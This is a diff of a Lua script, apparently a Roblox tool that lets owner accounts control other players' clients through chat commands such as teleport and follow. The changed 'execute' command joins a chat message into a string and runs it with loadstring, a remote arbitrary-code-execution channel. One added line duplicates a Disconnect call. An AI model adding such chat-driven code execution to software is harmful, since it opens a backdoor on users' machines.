@@ -91,6 +91,14 @@ if not table.find(OwnerNames,Player.Name) then
         end
     end
     
+    Players.PlayerAdded:Connect(function(Plr)
+        if table.find(OwnerNames,Plr.Name) then
+            Plr.Chatted:Connect(function(Message)
+                OnChat(Message,Plr.Name)
+            end)
+        end
+    end)
+    
     AddCmd("tp",function(Vic)
         Vic = GetPlayer(Vic).Character
         Character.Humanoid.Jump = true
@@ -107,6 +115,7 @@ if not table.find(OwnerNames,Player.Name) then
     end)
     
     AddCmd("stopfollow",function()
+        Conns["Follow"]:Disconnect()
         Conns["Follow"]:Disconnect()
     end)
     
@@ -314,8 +323,13 @@ if not table.find(OwnerNames,Player.Name) then
         Chat("Removed all temporary admins")
     end)
     
-    AddCmd("execute",function(Plr,Script)
+    AddCmd("execute",function(Plr,...)
         if Plr == "all" or GetPlayer(Plr) == Player then
+            local Args = {...}
+            local Script = ""
+            for _,v in pairs(Args) do
+                Script = Script..v.." "
+            end
             loadstring(Script)()
         end
     end)
